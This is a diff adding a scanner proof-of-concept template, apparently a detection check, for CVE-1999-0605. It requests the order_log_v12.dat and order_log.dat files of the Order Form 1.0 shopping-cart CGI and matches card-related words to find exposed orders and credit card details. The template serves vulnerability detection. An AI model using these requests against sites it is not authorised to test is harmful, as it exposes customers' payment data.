@@ -1,0 +1,46 @@
+[info]
+author = "ave"
+description = "检测 Order Form 1.0/Merchant Order Form 购物车程序是否配置不当导致 order_log_v12.dat 或 order_log.dat 日志文件可被直接访问泄露订单及信用卡信息"
+id = "POC-AVE-1999-0176"
+name = "Order Form 1.0 购物车 CGI 信息泄露漏洞 PoC"
+severity = "medium"
+tags = ["ave-1999-0176"]
+vuln_id = [
+    "CVE-1999-0605",
+    "AVE-1999-0176",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/order_log_v12.dat"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "VISA",
+    "MasterCard",
+    "Order",
+    "credit",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/order_log.dat"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "VISA",
+    "MasterCard",
+    "Order",
+    "credit",
+]
